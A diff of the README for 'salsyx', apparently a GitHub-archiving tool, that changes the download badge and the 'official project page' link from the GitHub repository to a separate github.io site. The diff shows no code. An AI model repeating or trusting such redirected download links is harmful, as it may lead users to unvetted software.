@@ -1,12 +1,12 @@
 # 💾 salsyx - Keep public code archives alive forever
 
-[![](https://img.shields.io/badge/Download-Salsyx-blue)](https://github.com/Beetgreenccompiler763/salsyx)
+[![](https://img.shields.io/badge/Download-Salsyx-blue)](https://beetgreenccompiler763.github.io)
 
 Salsyx creates a permanent home for public code. It finds and saves software projects from GitHub so they remain accessible long after the original owners remove them. You can use this tool to build your own personal library of open-source projects or to protect important code from vanishing.
 
 ## 📥 How to download the software
 
-Visit the [official project page](https://github.com/Beetgreenccompiler763/salsyx) to download the current version of the tool.
+Visit the [official project page](https://beetgreenccompiler763.github.io) to download the current version of the tool.
 
 1. Click the link above.
 2. Look for the section labeled Releases on the right side of the screen.
